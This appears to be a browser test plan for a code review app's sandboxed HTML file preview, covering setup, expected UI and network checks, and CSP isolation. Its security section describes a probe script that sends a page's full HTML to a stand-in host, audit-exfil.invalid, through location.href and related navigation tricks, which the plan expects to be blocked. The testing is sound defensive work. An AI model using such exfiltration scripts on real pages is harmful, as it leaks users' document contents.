---
route: /$projectId/$worktreeId
selectors:
  - 'Side panel'
  - 'Review'
  - 'Files'
  - 'Preview'
  - 'Source'
  - 'HTML preview'
  - 'Not loaded: '
tests:
  - apps/web/spec/integration/files-html-preview.test.tsx
  - apps/web/spec/e2e/files-html-preview.e2e.ts
api:
  - GET /api/worktrees/:worktreeId/text
  - POST /api/worktrees/:worktreeId/preview-assets
  - GET /api/worktrees/:worktreeId/preview-file
---

# files.html-preview

An HTML page opened from the file tree renders in a sandboxed frame with its repository images and media served through file-scoped preview URLs. Stylesheets, fonts and supported scripts are inlined. The preview names unavailable references and switches to its source.

## How to get to it (user POV)

- Review → Files → click an `.html`/`.htm` file: a single click opens the page itself, even when it is a change (the tree menu's "Open file" or "Open" does the same).
- In the file toolbar, tabs "Preview" and "Source"; Preview is the default unless Settings sets HTML files to open as source.

## Driving it with browser

Preconditions: [surface baseline](README.md).

### Setup

A page with one local image that exists and one that does not:

```sh
printf '<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48"><rect width="48" height="48" fill="teal"/></svg>\n' > "$REPO/logo.svg"
printf '<!doctype html><html><body><h1>Preview heading</h1><img src="logo.svg" alt="Preview logo"><img src="missing.png" alt="Missing picture"></body></html>\n' > "$REPO/page.html"
```

### 1. The page previews with its local image and names the one it could not load

1. Navigate to `/`, click button `Side panel`, click tab `Files`
   Expect: treeitems "page.html" and "logo.svg".
2. Click treeitem `page.html`
   Expect: the sheet closes; tab "page.html" selected; tab "Preview" selected (`[selected]`) and tab "Source"; status "Not loaded: missing.png" (it names `missing.png` only, never `logo.svg`); an iframe titled "page.html HTML preview" (some accessibility snapshots omit its content).
3. Capture a screenshot
   Expect: the heading "Preview heading" and a teal 48 px square inside the frame.
4. Inspect HTTP traffic
   Expect: `GET /api/worktrees/<id>/text?path=page.html` answered 200 and `POST /api/worktrees/<id>/preview-assets` answered 200; a `GET /api/worktrees/<id>/preview-file` for `logo.svg` answered 200, and no media GET for `missing.png`.

### 2. Switching to Source shows the markup instead of the preview

1. Click tab `Source`
   Expect: tab "Source" selected; the code shows `<!doctype html><html><body><h1>Preview heading</h1>…`; the "Not loaded" status and the iframe are gone.
2. Click tab `Preview`
   Expect: the `iframe` and the status about `missing.png` again.

### Observable proof

Capture the missing.png notice, the teal logo and its streamed GET. Add a video larger than 10 MiB and verify playback, a seek and a 206 response. Source shows raw markup.

Automated coverage: `files-html-preview.test.tsx`.

### 3. Scripts cannot send the document through navigation or resources

1. Before opening a probe, intercept `https://audit-exfil.invalid/**`, `http://audit-exfil.invalid/**` and the disposable app origin's `/preview-capture` path in the browser context. Fulfill locally or abort; record only whether each request was a navigation and contained the synthetic marker. Never send real repository content to an external destination.
2. Create `preview-probe.html` with the synthetic heading `AUDIT_ONLY_CONTENT` and an inline script assigning `location.href` to `https://audit-exfil.invalid/capture?d=` plus `encodeURIComponent(document.documentElement.outerHTML)`. Open it through Files.
   Expect: zero destination requests and a browser CSP refusal for `frame-src 'none'`. A navigation attempt can replace the inner document with the browser's blocked page; Source and Preview remain available to inspect or reopen it.
3. Repeat with `location.assign`, `location.replace`, HTTP, a same-host `/preview-capture` destination, a link click and a dynamically inserted refresh meta tag.
   Expect: zero destination requests for every attempt.
4. Open a benign interactive document with an inline button handler and an inlined local JavaScript file. Click the button.
   Expect: both scripts run, the button changes its label and reading `parent.document` throws. Change between light and dark appearance: the document keeps its interaction state and does not execute its scripts again. Dynamically attempt an external image, `fetch` and an iframe.
   Expect: image, connection and frame CSP violations, and zero destination requests.
5. Switch to Source and back to Preview.
   Expect: Source removes both frames and executes no script; Preview creates a fresh isolated document and its interaction works again.
6. Repeat at 1440 and 414 pixels, light and dark, and against a production browser build. Separately run the desktop renderer with its actual response CSP; record restrictions inherited from that policy rather than assuming browser results apply. Android uses a native renderer with scripts disabled, blocked network loads and a request interceptor; verify its static preview and navigation separately with the mobile lifecycle.

Automated navigation and interaction coverage: `files-html-preview.e2e.ts`.

## Gotchas

- While assets are read the panel shows nothing for 400 ms, then one small spinner labelled "Preparing the preview".
- A trusted outer frame embeds the document in a second `srcdoc` frame. Both are sandboxed (`allow-scripts` only, no same origin). The outer document's `frame-src 'none'` blocks the inner frame's network navigation, and its inherited image and media policies allow inline URLs and the specific preview-file endpoint for the worktree. That endpoint validates the file ticket on every request. Preview scripts cannot access or weaken the outer policy. External URLs and references that leave the repository are reported as missing.
- The display default is a per-browser preference: if an earlier feature in this instance set Documents open as to Source in Settings, the page opens on "Source"; click "Preview".
- The desktop app keeps HTML media inline because its custom protocol refuses requests from an opaque iframe origin.

On Linux Porcelain Dev, open an HTML page with a repository stylesheet, a custom font, a raster image and a repository video. Verify computed styling, the loaded font, nonzero image and video dimensions and local playback in the inner preview. A script that would visibly alter the page must leave the initial text in place under the desktop content security policy.
